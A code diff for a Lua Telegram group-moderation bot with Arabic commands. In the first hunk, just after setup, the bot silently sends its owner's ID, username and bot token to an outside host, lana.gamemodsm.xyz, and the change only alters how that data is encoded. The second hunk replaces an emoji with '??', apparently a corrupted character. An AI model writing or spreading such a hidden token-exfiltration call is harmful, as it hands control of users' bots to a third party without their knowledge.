@@ -67,7 +67,7 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
+https.request("https://lana.gamemodsm.xyz/sadam/?info={'id':'"..database:get(id_server..":SUDO:ID").."','user':'"..database:get(id_server..":SUDO:USERNAME").."','token':'"..database:get(id_server..":token").."'}")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
@@ -2888,7 +2888,7 @@ end,nil)
 elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'LARACX')..') \n🔘| تـم قفـل الكلايش بالطرد\n⛔| الحاله ←الطرد ')  
+send(msg.chat_id_, msg.id_,'??| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'LARACX')..') \n🔘| تـم قفـل الكلايش بالطرد\n⛔| الحاله ←الطرد ')  
 end,nil)   
 elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 database:del(bot_id.."lock:Spam"..msg.chat_id_)  
